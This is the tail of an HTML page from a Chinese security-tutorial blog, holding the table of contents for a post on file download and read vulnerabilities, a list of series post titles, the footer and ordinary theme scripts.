+            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-number">2.</span> <span class="toc-text">文件下载</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B"><span class="toc-number">2.2.</span> <span class="toc-text">检测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">2.3.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E5%8F%82%E6%95%B0"><span class="toc-number">2.4.</span> <span class="toc-text">下载参数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AE%E8%B0%83%E7%94%A8%E9%85%8D%E5%90%88"><span class="toc-number">2.5.</span> <span class="toc-text">各种协议调用配合</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B6%89%E5%8F%8A%E6%A1%88%E4%BE%8B%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">涉及案例：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Pikachu-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%B5%8B%E8%AF%95-%E5%8F%82%E6%95%B0"><span class="toc-number">3.1.</span> <span class="toc-text">Pikachu-文件下载测试-参数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Zdns-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9C%9F%E5%AE%9E%E6%B5%8B%E8%AF%95-%E5%8A%9F%E8%83%BD%E7%82%B9"><span class="toc-number">3.2.</span> <span class="toc-text">Zdns-文件下载真实测试-功能点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%8F%E7%B1%B3%E8%B7%AF%E7%94%B1%E5%99%A8-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E7%9C%9F%E5%AE%9E%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.3.</span> <span class="toc-text">小米路由器-文件读取真实测试-漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RoarCTF2019-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E7%9C%9F%E9%A2%98%E5%A4%8D%E7%8E%B0-%E6%AF%94%E8%B5%9B"><span class="toc-number">3.4.</span> <span class="toc-text">RoarCTF2019-文件读取真题复现-比赛</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BE%E5%BA%A6%E6%9D%AF-2017-%E4%BA%8C%E6%9C%88-Zone-%E7%9C%9F%E9%A2%98%E5%A4%8D%E7%8E%B0-%E6%AF%94%E8%B5%9B%E6%8B%93%E5%B1%95"><span class="toc-number">3.5.</span> <span class="toc-text">百度杯 2017 二月-Zone 真题复现-比赛拓展</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B6%89%E5%8F%8A%E8%B5%84%E6%BA%90"><span class="toc-number">4.</span> <span class="toc-text">涉及资源</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-4 i,
+        .toc-level-4 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2021/09/21/33WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/" title="上一篇: 33WEB漏洞-逻辑越权之水平垂直越权全解">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2021/09/21/31WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/" title="下一篇: 31WEB漏洞-文件操作之文件包含漏洞全解">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/37WEB%E6%BC%8F%E6%B4%9E-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP/">37WEB漏洞-反序列化之PHP</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/36WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/">36WEB漏洞-逻辑越权之验证码与Token及接口</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/35WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E5%8F%8A%E6%8E%A5%E5%8F%A3%E7%88%86%E7%A0%B4/">35WEB漏洞-逻辑越权之找回机制及接口爆破</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/34WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%94%AF%E4%BB%98%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9%E5%AE%89%E5%85%A8/">34WEB漏洞-逻辑越权之支付数据篡改安全</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/33WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/">33WEB漏洞-逻辑越权之水平垂直越权全解</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/32WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/">32WEB漏洞-文件操作之文件下载读取全解</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/31WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/">31WEB漏洞-文件操作之文件包含漏洞全解</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/30WEB%E6%BC%8F%E6%B4%9E-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/">30WEB漏洞-RCE代码及命令执行漏洞全解</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/29WEB%E6%BC%8F%E6%B4%9E-CSRF%E5%8F%8ASSRF%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E8%AE%B2%E8%A7%A3/">29WEB漏洞-CSRF及SSRF漏洞案例讲解</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/28WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D/">28WEB漏洞-XSS跨站之WAF绕过及安全修复</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/27WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E4%BB%A3%E7%A0%81%E5%8F%8Ahttponly%E7%BB%95%E8%BF%87/">27WEB漏洞-XSS跨站之代码及httponly绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/26WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E8%AE%A2%E5%8D%95%E5%8F%8AShell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80%E8%AE%B0/">26WEB漏洞-XSS跨站之订单及Shell箱子反杀记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/25WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E5%8E%9F%E7%90%86%E5%88%86%E7%B1%BB%E5%8F%8A%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/">25WEB漏洞-XSS跨站之原理分类及攻击手法</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/24WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D/">24WEB漏洞-文件上传之WAF绕过及安全修复</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/23WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E7%BC%96%E8%BE%91%E5%99%A8%E5%AE%89%E5%85%A8/">23WEB漏洞-文件上传之解析漏洞编辑器安全</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/22WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E5%86%85%E5%AE%B9%E9%80%BB%E8%BE%91%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/">22WEB漏洞-文件上传之内容逻辑数组绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/21WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E5%90%8E%E7%AB%AF%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/">21WEB漏洞--文件上传之后端黑白名单绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/20WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E5%9F%BA%E7%A1%80%E5%8F%8A%E8%BF%87%E6%BB%A4%E6%96%B9%E5%BC%8F/">20WEB漏洞--文件上传之基础及过滤方式</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/19WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%B7%B1%E5%85%A5WAF%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/">19WEB漏洞--SQL注入之深入WAF注入绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/18WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%A0%86%E5%8F%A0%E5%8F%8AWAF%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5/">18WEB漏洞--SQL注入之堆叠及WAF绕过注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/17WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E4%BA%8C%E6%AC%A1%E3%80%81%E5%8A%A0%E8%A7%A3%E5%AF%86%E3%80%81DNS%E7%AD%89%E6%B3%A8%E5%85%A5/">17WEB漏洞--SQL注入之二次、加解密、DNS等注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/16WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F%E5%8F%8A%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8/">16WEB漏洞--SQL注入之查询方式及报错盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/15WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOracle%E3%80%81MongoDB%E6%B3%A8%E5%85%A5/">15WEB漏洞--SQL注入之Oracle、MongoDB注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/14WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5/">14WEB漏洞--SQL注入之类型及提交注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/13WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5/">13WEB漏洞--SQL注入之MYSQL注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/12WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%AE%80%E8%A6%81SQL%E6%B3%A8%E5%85%A5/">12WEB漏洞--SQL注入之简要SQL注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/11WEB%E6%BC%8F%E6%B4%9E-%E5%BF%85%E6%87%82%E7%9F%A5%E8%AF%86/">11WEB漏洞--必懂知识</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/10%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%B5%84%E4%BA%A7%E7%9B%91%E6%8E%A7%E6%8B%93%E5%B1%95/">10信息收集-资产监控拓展</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/09%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-APP%E5%8F%8A%E5%85%B6%E4%BB%96%E8%B5%84%E4%BA%A7%E7%AD%89/">09信息收集--APP及其他资产等</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/08%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%9E%B6%E6%9E%84%EF%BC%8C%E6%90%AD%E5%BB%BA%EF%BC%8CWAF/">08信息收集--架构，搭建，WAF</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/07%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-CDN%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF/">07信息收集--CDN绕过技术</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/06%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/">06基础入门--加密编码算法</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/05%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E7%B3%BB%E7%BB%9F%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%BA%93/">05基础入门--系统及数据库</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/04%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-WEB%E6%BA%90%E7%A0%81%E6%8B%93%E5%B1%95/">04基础入门--WEB源码拓展</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/03%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%90%AD%E5%BB%BA%E5%AE%89%E5%85%A8%E6%8B%93%E5%B1%95/">03基础入门--搭建安全拓展</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/12/02%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8B%93%E5%B1%95/">02基础入门--数据包拓展</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/10/01%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%A6%82%E5%BF%B5%E5%90%8D%E8%AF%8D/">01基础入门--概念名词</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2021 Al0nez
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 6;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        $("a[target=_blank]").removeAttr("target");
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
